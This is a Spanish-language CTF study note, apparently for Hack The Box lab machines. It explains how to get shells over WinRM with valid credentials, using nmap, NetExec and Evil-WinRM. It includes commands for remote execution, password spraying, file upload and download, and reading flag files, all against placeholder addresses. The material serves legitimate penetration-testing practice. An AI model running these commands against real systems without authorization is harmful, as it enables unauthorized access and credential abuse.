---
tags: [windows, windows-tools]
---

> **WinRM (Windows Remote Management)** es el protocolo de Microsoft para administración remota de sistemas Windows. Usa SOAP sobre HTTP/HTTPS en **puerto 5985** (HTTP) y **5986** (HTTPS). Esta guía cubre lo que hemos practicado: obtener shell con NetExec y Evil-WinRM cuando ya tenemos credenciales.

---

## Quickstart — El shell en 2 minutos

```bash
# 1. Confirmar que WinRM está abierto
nmap -p 5985,5986 -sV 10.10.10.10

# 2. Probar autenticación con NetExec (el (Pwn3d!) confirma admin)
netexec winrm 10.10.10.10 -u Administrator -p 'Password123'

# 3. Ejecutar comandos sin shell interactiva
netexec winrm 10.10.10.10 -u Administrator -p 'Password123' -x 'whoami'

# 4. Obtener shell interactiva con Evil-WinRM
evil-winrm -i 10.10.10.10 -u Administrator -p 'Password123'
```

> 💡 **WinRM vs RDP:** WinRM te da una shell PowerShell sin GUI. Es más rápido, más sigiloso, y funciona incluso cuando RDP está deshabilitado.

---

## WinRM en la fase de reconocimiento

WinRM suele aparecer junto a SMB (445) y RPC (135) en máquinas Windows. Cuando ves el puerto **5985** o **5986** en tu nmap, trátalo como un mecanismo de entrega de shell — no necesitas explotarlo, solo necesitas credenciales válidas.

### Patrón clásico de puertos Windows

```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server     # RDP — acceso GUI
5985/tcp  open  wsman             # WinRM — shell PowerShell
47001/tcp open  winrm
```

> 💡 **Cuando ves WinRM + SMB + RDP en la misma máquina**, tu prioridad es encontrar credenciales. Una vez que las tienes, puedes elegir tu shell: RDP para GUI (`xfreerdp`), WinRM para comandos con NetExec, o SMB para acceso a archivos (`smbclient`).

---

## NetExec — WinRM Authentication & Command Execution

NetExec es la forma más rápida de probar credenciales WinRM y ejecutar comandos sin una shell interactiva completa.

```bash
# Autenticar — el tag (Pwn3d!) confirma acceso admin
netexec winrm 10.10.10.10 -u user -p 'Password123'
# Output:
# WINRM  10.10.10.10  5985  TARGET  [*] Windows 10 / Server 2019 Build 19041 (name:TARGET)
# WINRM  10.10.10.10  5985  TARGET  [+] Target\user:Password123 (Pwn3d!)

# Ejecutar un comando
netexec winrm 10.10.10.10 -u user -p 'Password123' -x 'whoami'

# Ejecutar PowerShell
netexec winrm 10.10.10.10 -u user -p 'Password123' -x 'powershell -c "Get-Process"'

# Password spray
netexec winrm 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce

# Enumeración no interactiva (encontrar usuarios + flag)
netexec winrm 10.10.10.10 -u Administrator -p 'Password123' -x 'dir C:\Users'
netexec winrm 10.10.10.10 -u Administrator -p 'Password123' -x 'type C:\Users\mike\Desktop\flag.txt'
```

> 💡 **Tag `(Pwn3d!)`:** NetExec lo muestra cuando el usuario autenticado tiene privilegios de **administrador local** en el target. Si ves `(Pwn3d!)`, tienes control total — sin necesidad de escalar privilegios.

---

## Evil-WinRM — Shell interactiva (alternativa, aún no usada en writeups)

En los writeups solo hemos usado NetExec con `-x` para comandos rápidos. Evil-WinRM es una alternativa popular que da shell PowerShell interactiva completa — la usaremos en futuras máquinas.

```bash
# Con contraseña
evil-winrm -i 10.10.10.10 -u Administrator -p 'Password123'

# Con SSL (puerto 5986)
evil-winrm -i 10.10.10.10 -u Administrator -p 'Password123' -S

# File transfer dentro de la shell
upload /local/path/file.exe C:\Users\Administrator\file.exe
download C:\Users\Administrator\flag.txt /local/path/flag.txt
```

---

## CTF Workflow — WinRM

1. **Enumerar** — `nmap -p 5985,5986 -sV` para confirmar que WinRM está abierto
2. **Encontrar credenciales** — buscar en archivos web, crackear hashes de Responder, revisar shares SMB
3. **Probar auth** — `netexec winrm TARGET -u USER -p PASS -x 'whoami'`
4. **Obtener shell** — NetExec con `-x` para comandos rápidos
5. **Enumerar** — `whoami`, `dir C:\Users`, `type C:\Users\...\Desktop\flag.txt`

---

## 🔗 Related

**Machines:** [[🩰 Dancing]], [[💥 Explosion]], [[🧑‍🚒 Responder]]

**Guides:** [[🔐 NTLM]], [[🖥️ xfreerdp]], [[🔧 John the Ripper]]

---

## References

- [HackTricks — WinRM](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/winrm)
- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
- [NetExec Wiki](https://www.netexec.wiki/)
